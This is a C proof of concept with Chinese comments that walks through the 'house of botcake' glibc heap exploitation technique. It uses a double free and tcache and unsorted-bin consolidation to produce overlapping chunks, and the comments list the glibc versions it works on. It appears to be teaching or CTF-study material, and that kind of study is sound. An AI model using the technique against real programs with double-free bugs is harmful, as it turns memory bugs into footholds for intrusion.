/**
 *  漏洞名称： house of botcake
 *  适用版本： glibc-2.26 ~ glibc-2.39
 *  漏洞危害： 可以实现chunk的Overlapping
 *  复现环境： Ubuntu 22.04
 *  编译命令： gcc -g house_of_botcake.c -o house_of_botcake -ldemo
 */

/**
 *  利用条件：存在double free漏洞
 *  利用思路:   通过释放两个物理相邻的chunk，分别为prev_chunk和chunk
 *              将这两个chunk放入unsorted bin并且发生consolidate
 *              在tcache bin中获取一个位置
 *              然后free掉chunk将其放入tcache bin中
 *              此时unsorted bin中的chunk和tcache bin中的chunk产生了Overlapping
 */

#include <demo.h>
int main()
{
    dm_InitStd();

    printf("创建7个chunk用于填充tcache bin\n");
    u64 tcache[7];
    for (int i = 0; i < 7; i++)
    {
        tcache[i] = MALLOC(0x100);
    }

    printf("创建两个chunk用于Overlapping\n");
    u64 prev_chunk = MALLOC(0x100); // 将要Extend的chunk
    u64 chunk = MALLOC(0x100);      // 将要Overlapping的chunk
    MALLOC(0x10);                   // 占位

    printf("1.填充tcache bin\n");
    for (int i = 0; i < 7; i++)
    {
        FREE(tcache[i]);
    }

    printf("2.释放chunk, 将会被放入unsorted bin\n");
    FREE(chunk);

    printf("3.释放prev_chunk, 将会被放入unsorted bin并且与chunk发生consolidate\n");
    FREE(prev_chunk);

    printf("4.从tcache bin中取出一个chunk\n");
    MALLOC(0x100);

    printf("5.对chunk进行double free即可实现chunk的Overlapping\n");
    FREE(chunk);

    printf("此时unsorted bin中存在的chunk和tcache bin中的chunk产生了Overlapping\n");
    prev_chunk = MALLOC(0x100 + 0x100 + 0x10);
    chunk = MALLOC(0x100);
    PUT_VALUE("prev_chunk", GET_VALUE_OFFSET(prev_chunk, 0x100 + 0x10));
    PUT_VALUE("chunk     ", chunk);
    
    return 0;
}
